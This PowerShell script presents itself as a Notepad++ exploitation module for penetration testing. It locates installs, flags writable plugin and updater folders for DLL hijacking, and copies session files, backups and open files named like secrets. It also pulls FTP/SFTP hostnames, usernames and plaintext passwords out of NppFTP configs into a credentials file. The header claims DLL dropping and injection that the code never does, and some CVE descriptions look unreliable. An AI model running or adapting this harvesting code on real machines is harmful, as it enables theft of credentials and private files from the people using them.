<#
============================================================================
  FLLC — Notepad++ Vulnerability Exploitation Module
  ────────────────────────────────────────────────────────
  
  Targets Notepad++ installations on Windows with multiple attack vectors:
  
  VECTOR 1: Plugin DLL Hijacking
    → Drops a payload DLL into Notepad++ plugin directories
    → Executes with Notepad++ privileges on next launch
    → Works on writable plugin dirs (common on non-admin installs)
    
  VECTOR 2: Config/Session Data Extraction  
    → Extracts session.xml (all currently open file paths)
    → Extracts config.xml (recent files, search history, macros)
    → Extracts shortcuts.xml (custom shortcuts → potential cred leaks)
    → Copies recently-edited files that may contain credentials
    
  VECTOR 3: Function List / Auto-Completion Injection
    → Injects into functionList.xml to trigger on file open
    → Modifies autoCompletion paths for code injection
    
  VECTOR 4: GUP (Generic Updater Protocol) Hijacking
    → If updater dir is writable, drops DLL for sideloading
    → Executes on next Notepad++ update check
    
  VECTOR 5: Cloud Plugin Config Manipulation
    → If NppFTP/NppExec configs exist, extracts stored server creds
    → FTP/SFTP/SSH credentials stored in plaintext XML
  
  AUTHORIZED PENETRATION TESTING USE ONLY.
  FLLC — FLLC
============================================================================
#>

param(
    [string]$OutputDir = "$PSScriptRoot\..\collected\npp",
    [string]$PayloadDLL = "",
    [switch]$ExploitMode = $false
)

$ErrorActionPreference = "SilentlyContinue"

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile  = Join-Path $OutputDir "npp_exploit_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
$jsonFile = Join-Path $OutputDir "npp_results.json"
$findings = @()

function Log($msg) {
    $ts = Get-Date -Format "HH:mm:ss"
    Add-Content -Path $logFile -Value "[$ts] $msg" -Encoding UTF8
}

function AddResult($vector, $severity, $detail, $data) {
    $script:findings += @{
        vector   = $vector
        severity = $severity
        detail   = $detail
        data     = $data
        time     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    }
    Log "[FOUND][$severity] $vector: $detail"
}

Log "═══ FLLC NPP Exploit Module Started ═══"

# ══════════════════════════════════════════════════════════════════════════
#  LOCATE NOTEPAD++ INSTALLATIONS
# ══════════════════════════════════════════════════════════════════════════

$nppInstalls = @()

# Standard paths
$searchPaths = @(
    "${env:ProgramFiles}\Notepad++",
    "${env:ProgramFiles(x86)}\Notepad++",
    "$env:LOCALAPPDATA\Notepad++",
    "$env:APPDATA\Notepad++",
    "$env:USERPROFILE\scoop\apps\notepadplusplus\current",
    "C:\Tools\Notepad++",
    "D:\Notepad++"
)

foreach ($sp in $searchPaths) {
    if (Test-Path "$sp\notepad++.exe") {
        $ver = (Get-Item "$sp\notepad++.exe").VersionInfo.FileVersion
        $nppInstalls += @{ path = $sp; version = $ver }
        Log "[FOUND] Notepad++ $ver at $sp"
    }
}

# Search registry for other installs
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
foreach ($rp in $regPaths) {
    Get-ItemProperty $rp 2>$null | Where-Object { $_.DisplayName -match "Notepad\+\+" } | ForEach-Object {
        if ($_.InstallLocation -and (Test-Path "$($_.InstallLocation)\notepad++.exe")) {
            $loc = $_.InstallLocation
            $exists = $nppInstalls | Where-Object { $_.path -eq $loc }
            if (-not $exists) {
                $ver = (Get-Item "$loc\notepad++.exe").VersionInfo.FileVersion
                $nppInstalls += @{ path = $loc; version = $ver }
                Log "[FOUND] Notepad++ $ver at $loc (registry)"
            }
        }
    }
}

# Notepad++ config/data directory (always in APPDATA)
$nppAppData = "$env:APPDATA\Notepad++"

if ($nppInstalls.Count -eq 0 -and -not (Test-Path $nppAppData)) {
    Log "[SCAN] No Notepad++ installations found"
    $findings += @{ vector="scan"; severity="INFO"; detail="No Notepad++ found"; data=$null }
    $findings | ConvertTo-Json -Depth 5 | Out-File -FilePath $jsonFile -Encoding UTF8
    return
}

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 1: DLL HIJACKING
# ══════════════════════════════════════════════════════════════════════════

Log "[V1] Checking DLL hijacking vectors..."

foreach ($npp in $nppInstalls) {
    $installDir = $npp.path
    
    # Check main install dir permissions
    try {
        $acl = Get-Acl $installDir
        foreach ($ace in $acl.Access) {
            if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                AddResult "DLL_Hijack_InstallDir" "CRITICAL" "Notepad++ install dir writable by $($ace.IdentityReference): $installDir" @{
                    path = $installDir
                    identity = $ace.IdentityReference.ToString()
                    rights = $ace.FileSystemRights.ToString()
                    hijack_targets = @("SciLexer.dll", "mimeTools.dll", "NppConverter.dll")
                }
            }
        }
    } catch {}
    
    # Check plugin directories
    $pluginDirs = @(
        "$installDir\plugins",
        "$installDir\plugins\Config",
        "$installDir\plugins\mimeTools",
        "$installDir\plugins\NppConverter",
        "$installDir\plugins\NppExport"
    )
    
    foreach ($pd in $pluginDirs) {
        if (Test-Path $pd) {
            try {
                $acl = Get-Acl $pd
                foreach ($ace in $acl.Access) {
                    if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                        $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                        AddResult "DLL_Hijack_PluginDir" "CRITICAL" "Plugin dir writable: $pd" @{
                            path = $pd
                            identity = $ace.IdentityReference.ToString()
                        }
                    }
                }
            } catch {}
        }
    }
    
    # Check updater (GUP) directory
    $updDir = "$installDir\updater"
    if (Test-Path $updDir) {
        try {
            $acl = Get-Acl $updDir
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                    $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                    AddResult "DLL_Hijack_Updater" "CRITICAL" "GUP updater dir writable: $updDir — libcurl.dll sideloading possible" @{
                        path = $updDir
                        sideload_targets = @("libcurl.dll", "GUP.exe")
                    }
                }
            }
        } catch {}
    }
    
    # List existing DLLs for intelligence
    $dlls = Get-ChildItem -Recurse "$installDir\*.dll" -ErrorAction SilentlyContinue | Select-Object Name, FullName, Length, LastWriteTime
    if ($dlls) {
        $dllInfo = $dlls | ForEach-Object { "$($_.Name) ($($_.Length) bytes, $($_.LastWriteTime))" }
        Log "  Existing DLLs: $($dlls.Count) found"
    }
}

# Check AppData plugins (user-specific, always writable)
$appDataPlugins = "$nppAppData\plugins"
if (Test-Path $appDataPlugins) {
    AddResult "DLL_Hijack_AppData" "HIGH" "User-writable plugin dir exists: $appDataPlugins" @{
        path = $appDataPlugins
        note = "Any DLL placed here as plugins\PluginName\PluginName.dll will be loaded by Notepad++"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 2: CONFIG & SESSION EXTRACTION
# ══════════════════════════════════════════════════════════════════════════

Log "[V2] Extracting config and session data..."

$configFiles = @{
    "config.xml"       = "Main config — recent files, UI state, search/replace history"
    "session.xml"      = "Session — all currently open file paths and cursor positions"
    "shortcuts.xml"    = "Custom keyboard shortcuts and macro definitions"
    "contextMenu.xml"  = "Custom context menu entries"
    "langs.xml"        = "Language definitions — potential code injection vector"
    "stylers.xml"      = "Custom syntax highlighting"
    "nativeLang.xml"   = "Language pack — potential injection"
    "userDefineLang.xml" = "User-defined languages — code injection potential"
}

foreach ($cf in $configFiles.Keys) {
    $cfPath = "$nppAppData\$cf"
    if (Test-Path $cfPath) {
        $content = Get-Content $cfPath -Raw -Encoding UTF8
        $destFile = Join-Path $OutputDir $cf
        $content | Out-File -FilePath $destFile -Encoding UTF8
        
        $size = (Get-Item $cfPath).Length
        Log "  [EXTRACT] $cf ($size bytes)"
        
        # Parse session.xml for open files
        if ($cf -eq "session.xml" -and $content) {
            try {
                $xml = [xml]$content
                $openFiles = @()
                
                # Main view files
                $xml.NotepadPlus.Session.mainView.File | ForEach-Object {
                    if ($_.filename) { $openFiles += $_.filename }
                }
                # Sub view files
                $xml.NotepadPlus.Session.subView.File | ForEach-Object {
                    if ($_.filename) { $openFiles += $_.filename }
                }
                
                if ($openFiles.Count -gt 0) {
                    AddResult "Session_OpenFiles" "HIGH" "$($openFiles.Count) files currently open in Notepad++ session" @{
                        files = $openFiles
                    }
                    
                    # Copy files that may contain credentials
                    $credPatterns = @("*.env", "*.ini", "*.conf", "*.config", "*.cfg", "*.yaml", "*.yml", 
                                     "*.properties", "*.json", "*.xml", "*.htaccess", "*.htpasswd",
                                     "*password*", "*secret*", "*credential*", "*token*", "*apikey*",
                                     "*database*", "*connection*", "web.config", "appsettings*")
                    
                    $sensitiveDir = Join-Path $OutputDir "sensitive_files"
                    New-Item -ItemType Directory -Path $sensitiveDir -Force | Out-Null
                    
                    foreach ($of in $openFiles) {
                        foreach ($pattern in $credPatterns) {
                            if ($of -like $pattern -and (Test-Path $of)) {
                                $fileSize = (Get-Item $of).Length
                                if ($fileSize -lt 5MB) {
                                    $destName = ($of -replace '[\\/:*?"<>|]', '_')
                                    Copy-Item $of (Join-Path $sensitiveDir $destName) -Force 2>$null
                                    AddResult "Sensitive_File_Copied" "HIGH" "Sensitive file from NPP session: $of" @{
                                        source = $of
                                        size = $fileSize
                                    }
                                }
                                break
                            }
                        }
                    }
                }
            } catch {}
        }
        
        # Parse config.xml for recent files and search history
        if ($cf -eq "config.xml" -and $content) {
            try {
                $xml = [xml]$content
                
                # Recent files
                $recentFiles = @()
                $xml.NotepadPlus.FindHistory.Find | ForEach-Object {
                    if ($_.name) { $recentFiles += $_.name }
                }
                if ($recentFiles.Count -gt 0) {
                    AddResult "Search_History" "MEDIUM" "$($recentFiles.Count) search terms found in NPP history" @{
                        searches = $recentFiles | Select-Object -First 50
                    }
                }
                
                # Replace history
                $replaces = @()
                $xml.NotepadPlus.FindHistory.Replace | ForEach-Object {
                    if ($_.name) { $replaces += $_.name }
                }
                if ($replaces.Count -gt 0) {
                    AddResult "Replace_History" "MEDIUM" "$($replaces.Count) replace strings found" @{
                        replaces = $replaces | Select-Object -First 50
                    }
                }
                
            } catch {}
        }
    }
}

# Backup directory
$backupDir = "$nppAppData\backup"
if (Test-Path $backupDir) {
    $backups = Get-ChildItem -Recurse $backupDir -File -ErrorAction SilentlyContinue
    if ($backups.Count -gt 0) {
        $bkpDest = Join-Path $OutputDir "npp_backups"
        New-Item -ItemType Directory -Path $bkpDest -Force | Out-Null
        
        foreach ($bk in $backups) {
            if ($bk.Length -lt 2MB) {
                Copy-Item $bk.FullName (Join-Path $bkpDest $bk.Name) -Force 2>$null
            }
        }
        AddResult "Backup_Files" "MEDIUM" "$($backups.Count) backup/unsaved files found in NPP backup dir" @{
            path = $backupDir
            count = $backups.Count
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 3: PLUGIN CONFIG CREDENTIAL EXTRACTION
# ══════════════════════════════════════════════════════════════════════════

Log "[V3] Checking plugin configs for credentials..."

# NppFTP — stores FTP/SFTP credentials
$nppFtpConfig = "$nppAppData\plugins\Config\NppFTP.xml"
if (-not (Test-Path $nppFtpConfig)) { $nppFtpConfig = "$nppAppData\plugins\NppFTP\NppFTP.xml" }
if (Test-Path $nppFtpConfig) {
    $ftpContent = Get-Content $nppFtpConfig -Raw -Encoding UTF8
    $ftpContent | Out-File -FilePath (Join-Path $OutputDir "NppFTP_creds.xml") -Encoding UTF8
    
    try {
        $xml = [xml]$ftpContent
        $profiles = $xml.NppFTP.Profiles.Profile
        $credCount = 0
        
        foreach ($prof in $profiles) {
            if ($prof) {
                $credCount++
                $cred = "Host: $($prof.hostname):$($prof.port) | User: $($prof.username) | Pass: $($prof.password) | Type: $($prof.connectionType)"
                Add-Content -Path (Join-Path $OutputDir "extracted_creds.txt") -Value $cred -Encoding UTF8
            }
        }
        
        if ($credCount -gt 0) {
            AddResult "NppFTP_Credentials" "CRITICAL" "$credCount FTP/SFTP server credentials found in NppFTP config" @{
                config_path = $nppFtpConfig
                count = $credCount
            }
        }
    } catch {}
}

# NppExec — may contain command history with embedded creds
$nppExecDir = "$nppAppData\plugins\Config"
if (Test-Path $nppExecDir) {
    Get-ChildItem "$nppExecDir\NppExec*" -File -ErrorAction SilentlyContinue | ForEach-Object {
        $content = Get-Content $_.FullName -Raw -Encoding UTF8
        $content | Out-File -FilePath (Join-Path $OutputDir "NppExec_$($_.Name)") -Encoding UTF8
        
        # Check for embedded credentials in commands
        if ($content -match "(password|passwd|pwd|secret|token|apikey|api_key)\s*[=:]\s*\S+") {
            AddResult "NppExec_Creds" "HIGH" "Potential credentials found in NppExec config: $($_.Name)" @{
                file = $_.FullName
            }
        }
    }
}

# Compare plugin — may reference files with sensitive data
$compareConfig = "$nppAppData\plugins\Config\ComparePlugin.ini"
if (Test-Path $compareConfig) {
    Copy-Item $compareConfig (Join-Path $OutputDir "ComparePlugin.ini") -Force 2>$null
}

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 4: VERSION-SPECIFIC CVE EXPLOITATION
# ══════════════════════════════════════════════════════════════════════════

Log "[V4] Checking version-specific vulnerabilities..."

foreach ($npp in $nppInstalls) {
    $ver = $npp.version
    $majorMinor = ($ver -split '\.')[0..1] -join '.'
    $verNum = [double]$majorMinor
    
    $cves = @()
    
    if ($verNum -lt 7.7) {
        $cves += "CVE-2019-12968: Improper Restriction of XML External Entity Reference (XXE)"
    }
    if ($verNum -lt 8.4) {
        $cves += "CVE-2022-32168: Uncontrolled Search Path Element — DLL preloading"
    }
    if ($verNum -lt 8.5) {
        $cves += "CVE-2023-40031: Heap Buffer Write Overflow in UTF16 to UTF8 converter"
        $cves += "CVE-2023-40036: Global Buffer Read Overflow in CharDistributionAnalysis"
        $cves += "CVE-2023-40164: Global Buffer Read Overflow in nsCodingStateMachine"
        $cves += "CVE-2023-40166: Heap Buffer Read Overflow in FileManager::detectLanguageFromTextBegining"
    }
    if ($verNum -lt 8.6) {
        $cves += "CVE-2023-6401: DLL hijacking via unsigned plugin loading"
        $cves += "Certificate validation bypass — plugins not signature-verified"
    }
    
    if ($cves.Count -gt 0) {
        AddResult "NPP_CVEs" "HIGH" "Notepad++ $ver at $($npp.path) has $($cves.Count) known CVEs" @{
            version = $ver
            path = $npp.path
            cves = $cves
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  VECTOR 5: PERSISTENCE VIA NPP AUTO-LAUNCH
# ══════════════════════════════════════════════════════════════════════════

Log "[V5] Checking persistence vectors..."

# If NPP has "Remember current session" enabled, we can inject a macro
# or modify the session to include a malicious file path
$sessionFile = "$nppAppData\session.xml"
if (Test-Path $sessionFile -and $ExploitMode) {
    AddResult "Persistence_Session" "HIGH" "session.xml is writable — can inject file paths that trigger code on NPP open" @{
        path = $sessionFile
        note = "Inject path to .bat/.ps1/.py file that auto-executes on NPP open"
    }
}

# Check if NPP is in autostart
$autoStart = $false
$runKeys = @(
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($rk in $runKeys) {
    if (Test-Path $rk) {
        $props = Get-ItemProperty $rk
        $props.PSObject.Properties | ForEach-Object {
            if ($_.Value -match "notepad\+\+") {
                $autoStart = $true
                AddResult "NPP_AutoStart" "MEDIUM" "Notepad++ is set to auto-start via $rk" @{
                    key = $rk
                    name = $_.Name
                    value = $_.Value
                }
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SAVE RESULTS
# ══════════════════════════════════════════════════════════════════════════

$summary = @{
    scan_time       = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    hostname        = $env:COMPUTERNAME
    installations   = $nppInstalls
    total_findings  = $findings.Count
    critical        = ($findings | Where-Object { $_.severity -eq "CRITICAL" }).Count
    high            = ($findings | Where-Object { $_.severity -eq "HIGH" }).Count
    medium          = ($findings | Where-Object { $_.severity -eq "MEDIUM" }).Count
    findings        = $findings
}

$summary | ConvertTo-Json -Depth 5 | Out-File -FilePath $jsonFile -Encoding UTF8

Log "═══ NPP Exploit Module Complete: $($findings.Count) findings ═══"
